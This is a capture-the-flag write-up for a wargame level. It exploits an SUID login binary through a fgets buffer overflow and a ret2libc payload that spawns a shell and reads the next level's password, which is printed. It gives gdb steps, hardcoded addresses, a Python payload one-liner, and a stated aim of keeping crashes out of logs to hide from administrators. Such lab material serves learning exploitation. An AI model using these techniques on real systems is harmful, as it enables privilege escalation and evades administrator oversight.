# Level 1

## Vulnerability



## Context

We find a binary with owner ```level01``` and SUID.
```
level01@OverRide:~$ ls -l
-rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01
```

When run, we see it prompts for a username (and probably later, a password).
```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: POTUS
verifying username....

nope, incorrect username...
```

## Solution

### main() overview
Let's take a deeper look at the program.
See [dissasembly notes](https://github.com/anyashuka/Override/blob/main/level01/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.

First ```main()``` prompts for a username and password, reading from stdin with ```fgets()```, and then calling ```verify_user_name()``` and ```verify_user_pass()```.

In each case, user input for username and password is compared with a hard value in memory and jumps to exit if not equal. 

In ```verify_user_name()```, we see that the username must be "dat_wil".

In ```verify_user_pass()```, we see that the password must be "admin".

However, when we try these values the program still quits. 
```
level01@OverRide:~$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
admin
nope, incorrect password...
```

### Exploit

First off, we can identify a vulnerability with ```fgets()``` to trigger a buffer overflow. 

Using our trusty [pattern generator and EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we crash the program and find we can overwrite the EIP at offset 80.
```
(gdb) r
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

In the previous project, [Rainfall](https://github.com/anyashuka/Rainfall), our strategy was to copy shellcode to the stack and jump to it (a classic stack-based buffer overflow). 

We've found a more elegant solution to use here: a ret2libc ("return-to-libc") attack, which will overwrite the EIP return address with a particular libc function address directly. 

In this case, we''re going to overwrite the EIP with the address of ```system```, "/bin/sh", and ```exit()```.
Let's find those addresses. 
```
(gdb) b *main
Breakpoint 1 at 0x80484d0

(gdb) r
Starting program: /home/users/level01/level01

Breakpoint 1, 0x080484d0 in main ()

(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```
Ok, here are our addresses:
- ```system()``` is at 0xf7e6aed0
- ```exit()``` is at 0xf7e5eb70
- "/bin/sh" is at 0xf7f897ec
Note: we will flip these for little endian!

Why bother add the ```exit()```? Because if we don't, then the shell will segfault upon exit – which will be recorded in the dmesg logs and visible to any system admin who looks... So basically, to erase our footsteps! 

### Build exploit

Let's build our attack payload:

[ 80 x "A" ] [ address of system ] [ address of exit ] [ address of "/bin/sh" ]

```
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
``` 

## Recreate Exploited Binary

As user ```level02```, in ```/tmp```, create and compile ```level01_source.c```
```
level02@OverRide:/tmp$ gcc level01_source.c -o level01_source
```

Edit permissions including suid, then move the binary to home directory.
```
level02@OverRide:/tmp$ chmod u+s level01_source; chmod +wx ~; mv level01_source ~
```

Exit back to user ```level01```, then launch the source with the ret2libc exploit (with new addresses for system, /bin/sh, and exit).
```
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat -) | ./level01_source
...
0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 does not have access!
```
